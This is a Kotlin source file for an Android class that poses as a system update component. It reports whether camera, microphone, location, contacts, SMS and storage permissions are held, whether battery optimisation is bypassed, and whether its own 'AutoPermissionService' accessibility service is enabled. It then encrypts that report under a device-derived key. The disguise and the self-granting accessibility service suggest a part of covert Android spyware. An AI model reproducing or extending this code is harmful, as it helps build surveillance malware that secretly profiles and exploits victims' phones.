package com.android.system.update.core

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import android.util.Base64
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SystemPermissionController(private val context: Context) {

    private val deviceKey: ByteArray by lazy {
        val id = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        MessageDigest.getInstance("SHA-256").digest(id.toByteArray())
    }

    fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
    }

    fun isCoreReady(): Boolean {
        val corePermissions = mutableListOf(
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.FOREGROUND_SERVICE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            corePermissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        return corePermissions.all { hasPermission(it) }
    }

    fun getPermissionsReport(): String {
        val report = JSONObject().apply {
            put("camera", hasPermission(Manifest.permission.CAMERA))
            put("microphone", hasPermission(Manifest.permission.RECORD_AUDIO))
            put("location", hasPermission(Manifest.permission.ACCESS_FINE_LOCATION))
            put("contacts", hasPermission(Manifest.permission.READ_CONTACTS))
            put("sms", hasPermission(Manifest.permission.READ_SMS))
            put("storage", checkStorageStatus())
            put("battery_optimization_ignored", isBatteryOptimizationIgnored())
            put("accessibility_enabled", isAccessibilityServiceEnabled())
        }
        return encrypt(report.toString())
    }

    private fun checkStorageStatus(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermission(Manifest.permission.READ_MEDIA_IMAGES) || hasPermission(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        return try {
            val expectedService = ComponentName(context, AutoPermissionService::class.java).flattenToString()
            val enabledServices = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            enabledServices?.contains(expectedService) == true
        } catch (e: Exception) {
            false
        }
    }

    private fun isBatteryOptimizationIgnored(): Boolean {
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            powerManager.isIgnoringBatteryOptimizations(context.packageName)
        } else true
    }

    private fun encrypt(data: String): String {
        val iv = ByteArray(12).also { java.security.SecureRandom().nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(data.toByteArray())
        return Base64.encodeToString(iv + encrypted, Base64.NO_WRAP)
    }
}